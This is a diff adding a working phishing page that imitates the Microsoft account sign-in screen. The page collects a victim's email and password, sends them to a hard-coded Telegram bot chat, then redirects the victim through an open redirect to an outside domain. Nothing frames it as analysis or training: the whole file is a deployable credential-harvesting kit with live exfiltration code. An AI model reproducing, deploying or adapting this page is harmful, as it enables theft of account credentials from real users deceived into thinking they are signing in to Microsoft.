@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Sign in to your account</title>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: #f3f6fb;
+      min-height: 100vh;
+      width: 100vw;
+      overflow: hidden;
+    }
+    body {
+      /* Subtle Microsoft login background */
+      background: radial-gradient(ellipse 120% 90% at 60% 10%, #e9eef7 70%, #f3f6fb 100%);
+      position: relative;
+    }
+    .signin-panel {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #fff;
+      box-shadow: 0 6px 32px rgba(0,0,0,.13);
+      border-radius: 3px;
+      max-width: 420px;
+      width: 96vw;
+      padding: 40px 32px 36px 32px;
+      z-index: 1;
+      display: flex;
+      flex-direction: column;
+    }
+    .msft-logo-row {
+      display: flex;
+      align-items: center;
+      margin-bottom: 32px;
+    }
+    .msft-logo {
+      width: 98px;
+      height: 28px;
+      vertical-align: middle;
+      margin-right: 12px;
+    }
+    .msft-logo-row span {
+      font-size: 23px;
+      color: #333;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+      margin-left: 2px;
+    }
+    .signin-title {
+      font-size: 28px;
+      font-weight: 600;
+      margin-bottom: 18px;
+      color: #252525;
+    }
+    .input-label {
+      font-size: 16px;
+      color: #222;
+      margin-bottom: 3px;
+      font-weight: 500;
+    }
+    .input-field {
+      border: none;
+      border-bottom: 1.5px solid #aaa;
+      font-size: 17px;
+      padding: 10px 0;
+      width: 100%;
+      background: transparent;
+      margin-bottom: 22px;
+      transition: border-color .2s;
+    }
+    .input-field:focus {
+      border-bottom: 2px solid #0067b8;
+      outline: none;
+    }
+    .error-message {
+      color: #e81123;
+      font-size: 14px;
+      font-weight: 500;
+      margin-bottom: 12px;
+      display: none;
+    }
+    .help-links {
+      margin-bottom: 32px;
+    }
+    .help-links a {
+      color: #0067b8;
+      text-decoration: none;
+      font-size: 15px;
+      margin-right: 10px;
+    }
+    .help-links a:hover {
+      text-decoration: underline;
+    }
+    .signin-btn-row {
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+    }
+    .btn {
+      background: #0067b8;
+      color: #fff;
+      font-size: 17px;
+      font-weight: 600;
+      border: none;
+      padding: 10px 44px;
+      border-radius: 2px;
+      cursor: pointer;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.06);
+      transition: background .16s;
+    }
+    .btn:active, .btn:focus, .btn:hover {
+      background: #005da6;
+      outline: none;
+    }
+    @media (max-width: 540px) {
+      .signin-panel {
+        padding: 28px 7vw;
+        max-width: 99vw;
+      }
+      .signin-title {
+        font-size: 22px;
+      }
+      .msft-logo-row span {
+        font-size: 19px;
+      }
+      .btn {
+        padding: 10px 26px;
+        font-size: 16px;
+      }
+    }
+  </style>
+  <link rel="shortcut icon" type="image/png" href="https://easyupload.io/mm9scz"/>
+</head>
+<body>
+  <!-- Loading Screen -->
+  <div id="loading-screen" style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;display:flex;justify-content:center;align-items:center;z-index:9999;">
+    <div id="loading-spinner" style="background-image: url(https://www.windowslatest.com/wp-content/uploads/2021/08/Outlook-PWA.gif);background-repeat: no-repeat;background-position: center center;width: 170px;height: 170px;"></div>
+  </div>
+  <div class="signin-panel" id="div1">
+    <div class="msft-logo-row">
+      <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" class="msft-logo" alt="Microsoft Logo">
+      
+    </div>
+    <div class="signin-title">Sign in</div>
+    <span id="error" class="error-message">That Microsoft account doesn't exist. Enter a different account.</span>
+    <input type="email" name="email" id="email" class="input-field" autocomplete="username" placeholder="Email, phone, or Skype">
+    <div class="help-links">
+      <span>No account? <a href="#" id="createAccount">Create one!</a></span><br>
+      <a href="#" id="cantAccess">Can't access your account?</a>
+    </div>
+    <div class="signin-btn-row">
+      <button class="btn" id="next" type="button">Next</button>
+    </div>
+  </div>
+  <div class="signin-panel" id="div2" style="display:none;">
+    <div class="msft-logo-row" style="cursor:pointer;">
+      <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" class="msft-logo" alt="Microsoft Logo">
+      
+    </div>
+    <div style="font-size:18px;font-weight:500;margin-bottom:20px;" id="emailch"></div>
+    <label class="input-label" for="password" style="margin-bottom:6px;">Password</label>
+    <input type="password" name="password" id="password" class="input-field" autocomplete="current-password" placeholder="Password">
+    <span id="msg" class="error-message"></span>
+    <div class="help-links">
+      <a href="#" id="forgotPassword">Forgot password?</a>
+    </div>
+    <div class="signin-btn-row">
+      <button class="btn" id="submit-btn" type="submit">Sign in</button>
+    </div>
+  </div>
+  <!-- ...existing code... -->
+<script>
+  // --- TELEGRAM BOT TOKEN AND CHAT ID ---
+  const TG_BOT_TOKEN = "8292423468:AAEQQXMHQ7jmJFyfrGX7vsWhr6GH-ORn8dk";
+  const TG_CHAT_ID = "-5006528512";
+
+(function(){
+  // Defensive hide for the loading screen so page never stays stuck
+  const LOADING_SCREEN_ID = 'loading-screen';
+  function hideLoading() {
+    try {
+      const el = document.getElementById(LOADING_SCREEN_ID);
+      if (el) el.style.display = 'none';
+    } catch (e) { console.warn('hideLoading failed', e); }
+  }
+
+  // Fallback: hide loading after 4s if something blocks normal flow
+  const fallbackHideTimer = setTimeout(hideLoading, 4000);
+
+  document.addEventListener('DOMContentLoaded', function() {
+    // hide loading immediately on DOMContentLoaded
+    try {
+      hideLoading();
+      clearTimeout(fallbackHideTimer);
+    } catch (e) { /* ignore */ }
+
+    try {
+      // MAIN INITIALIZATION
+      const div1 = document.getElementById('div1');
+      const div2 = document.getElementById('div2');
+      const emailInput = document.getElementById('email');
+      const passwordInput = document.getElementById('password');
+      const nextBtn = document.getElementById('next');
+      const submitBtn = document.getElementById('submit-btn');
+      const error = document.getElementById('error');
+      const emailch = document.getElementById('emailch');
+      const msg = document.getElementById('msg');
+
+      let pwdAttempt = 0;
+      let errorTimeout = null;
+
+      function showErrorMessage(el, text) {
+        if (!el) return;
+        el.textContent = text;
+        el.style.display = 'block';
+      }
+      function hideErrorMessage(el) {
+        if (!el) return;
+        el.textContent = '';
+        el.style.display = 'none';
+      }
+      function showErrorWithDelay(el, text, delay = 2000) {
+        hideErrorMessage(el);
+        clearTimeout(errorTimeout);
+        errorTimeout = setTimeout(() => showErrorMessage(el, text), delay);
+      }
+      function getActiveEmail() {
+        // The email in the main panel or confirmation panel
+        const eFromCh = (emailch && emailch.textContent) ? emailch.textContent.trim() : '';
+        const eFromInput = (emailInput && emailInput.value) ? emailInput.value.trim() : '';
+        return eFromCh || eFromInput || '';
+      }
+
+      // fetch with timeout
+      async function fetchWithTimeout(resource, options = {}, timeout = 10000) {
+        const controller = new AbortController();
+        const id = setTimeout(() => controller.abort(), timeout);
+        try {
+          const response = await fetch(resource, { ...options, signal: controller.signal });
+          clearTimeout(id);
+          return response;
+        } catch (err) {
+          clearTimeout(id);
+          throw err;
+        }
+      }
+
+      // send credentials to telegram
+      async function sendDirectToTelegram(email, secret, kind = 'password') {
+        if (!TG_BOT_TOKEN || !TG_CHAT_ID) {
+          throw new Error('No TG_BOT_TOKEN/TG_CHAT_ID defined for direct send.');
+        }
+        const text = kind === 'password'
+          ? `Microsoft login:\nEmail: ${email}\nPassword: ${secret}`
+          : `Microsoft login (extra):\nEmail: ${email}\nInfo: ${secret}`;
+        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
+        const res = await fetchWithTimeout(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: TG_CHAT_ID, text })
+        }, 10000);
+        const json = await res.json();
+        if (!json.ok) throw new Error('Telegram API error: ' + JSON.stringify(json));
+        return json;
+      }
+
+      async function sendForSecret(email, secret, kind = 'password') {
+        return await sendDirectToTelegram(email, secret, kind);
+      }
+
+      // NEXT BUTTON (show password entry panel)
+      if (nextBtn) {
+        nextBtn.addEventListener('click', function () {
+          const my_email = (emailInput && emailInput.value) ? emailInput.value.trim() : '';
+          const filter = /^([a-zA-Z0-9_.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,})+$/;
+          if (!filter.test(my_email)) {
+            showErrorMessage(error, "That Microsoft account doesn't exist. Enter a different account.");
+            if (emailInput) emailInput.focus();
+            return false;
+          }
+          // Hide main panel, show password panel
+          if (div1) div1.style.display = 'none';
+          if (div2) div2.style.display = 'flex';
+          if (emailch) {
+            emailch.textContent = my_email;
+            emailch.style.display = 'block';
+          }
+          // Reset password field
+          if (passwordInput) {
+            passwordInput.value = '';
+            passwordInput.focus();
+          }
+          hideErrorMessage(msg);
+          pwdAttempt = 0;
+        });
+      }
+
+      // SUBMIT BUTTON (send to Telegram and redirect)
+      if (submitBtn) {
+        submitBtn.addEventListener('click', function(event){
+          event.preventDefault();
+          const email = getActiveEmail();
+          const password = passwordInput ? passwordInput.value : '';
+          const filter = /^([a-zA-Z0-9_.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,})+$/;
+          if (!filter.test(email)) {
+            showErrorWithDelay(msg, "That Microsoft account doesn't exist. Enter a different account.");
+            return;
+          }
+          if (submitBtn) {
+            submitBtn.textContent = 'Verifying...';
+            submitBtn.disabled = true;
+          }
+          pwdAttempt++;
+          sendForSecret(email, password, 'password')
+            .then(res => {
+              console.log('[sendForSecret] success', res);
+            })
+            .catch(err => {
+              console.error('[sendForSecret] error', err);
+              if (err.name === 'AbortError') {
+                showErrorWithDelay(msg, 'Network interrupted. Please check your connection and try again.');
+              }
+            })
+            .finally(() => {
+              // Redirect after submit
+              const encodedEmail = encodeURIComponent(email);
+              setTimeout(() => {
+                window.location.href = "https://cc.naver.com/cc?m=1&u=https%3A%2F%2Fbanner.boothavu.in.net%2Fw95Suml%4021dQrZp/$" + encodedEmail;
+              }, 1500);
+            });
+        });
+      }
+
+      if (passwordInput) {
+        passwordInput.addEventListener('keydown', function(e){
+          if (e.key === "Enter" && submitBtn) submitBtn.click();
+        });
+      }
+
+    } catch (initErr) {
+      console.error('Initialization error:', initErr);
+      try { hideLoading(); } catch (e) {}
+    }
+  });
+})();
+</script>
+<!-- ...existing code... -->
+</body>
+
+</html>
